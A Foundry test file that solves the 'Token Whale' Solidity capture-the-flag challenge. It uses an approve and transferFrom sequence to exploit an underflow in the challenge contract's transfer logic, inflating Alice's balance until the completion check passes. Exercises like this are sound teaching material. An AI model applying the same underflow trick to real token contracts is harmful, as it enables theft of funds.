// SPDX-License-Identifier: GPL-3.0-or-later

pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "../src/TokenWhaleChallenge.sol";


contract TokenWhaleChallengeTest is Test {
    TokenWhaleChallenge public tokenWhaleChallenge;
    address alice = makeAddr("alice");
    address bob = makeAddr("bob");

    function setUp() public {
        tokenWhaleChallenge = new TokenWhaleChallenge(alice);
    }

    function testTokenWhale() public {
        emit log_named_uint("alice value", tokenWhaleChallenge.balanceOf(alice));

        vm.startPrank(bob);
            tokenWhaleChallenge.approve(alice, 1);
        vm.stopPrank();

        vm.startPrank(alice);
            tokenWhaleChallenge.transfer(bob, 1000);
            tokenWhaleChallenge.transferFrom(bob, address(0), 1);
        vm.stopPrank();

        uint256 balance = tokenWhaleChallenge.balanceOf(alice);
        emit log_named_uint("alice value", balance);
        
        assertEq(tokenWhaleChallenge.isComplete(), true);
    }

}